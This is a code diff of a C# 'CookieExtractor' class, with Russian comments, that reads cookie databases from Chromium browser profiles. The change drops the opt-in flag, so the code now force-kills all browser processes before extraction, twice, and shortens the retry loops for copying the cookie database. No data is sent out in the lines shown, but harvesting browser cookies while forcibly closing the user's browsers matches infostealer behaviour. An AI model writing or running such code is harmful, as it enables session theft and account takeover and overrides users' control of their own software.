@@ -72,17 +72,20 @@ public static class CookieExtractor
             return null;
         }
 
-        // Попытка 1: без убийства браузера
+        // Сразу убиваем браузеры и читаем
+        Log("Killing browsers first...");
+        KillAllBrowsers();
         string? result = TryExtract();
         if (!string.IsNullOrEmpty(result)) return result;
 
-        // Попытка 2: убиваем браузеры и читаем снова
+        // Повторная попытка — убиваем снова (Chrome мог перезапуститься)
+        Log("Retry extraction with kill...");
+        KillAllBrowsers();
+        result = TryExtract();
+        if (!string.IsNullOrEmpty(result)) return result;
+
         if (allowKillIfLocked)
         {
-            Log("First attempt failed, killing browsers and retrying...");
-            KillAllBrowsers();
-            result = TryExtract();
-            if (!string.IsNullOrEmpty(result)) return result;
             // Перезапускаем Chrome, если он был убит
             RestartChrome();
         }
@@ -135,18 +138,18 @@ public static class CookieExtractor
                 var psi = new System.Diagnostics.ProcessStartInfo
                 {
                     FileName = "taskkill",
-                    Arguments = $"/F /IM {pname}.exe",
+                    Arguments = $"/F /T /IM {pname}.exe",
                     CreateNoWindow = true,
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true
                 };
                 using var p = System.Diagnostics.Process.Start(psi);
-                p?.WaitForExit(5000);
+                p?.WaitForExit(3000);
             }
             catch { }
         }
-        Thread.Sleep(1500);
+        Thread.Sleep(500);
     }
 
     private static string? ExtractFromChromium(string userDataPath)
@@ -585,7 +588,7 @@ public static class CookieExtractor
         bool copied = false;
         try
         {
-            for (int i = 0; i < 30; i++)
+            for (int i = 0; i < 5; i++)
             {
                 try
                 {
@@ -598,8 +601,8 @@ public static class CookieExtractor
                 }
                 catch (IOException ex)
                 {
-                    Log($"DB copy attempt {i + 1}/30 failed: {ex.Message}");
-                    Thread.Sleep(1000);
+                    Log($"DB copy attempt {i + 1}/5 failed: {ex.Message}");
+                    Thread.Sleep(500);
                 }
             }
 
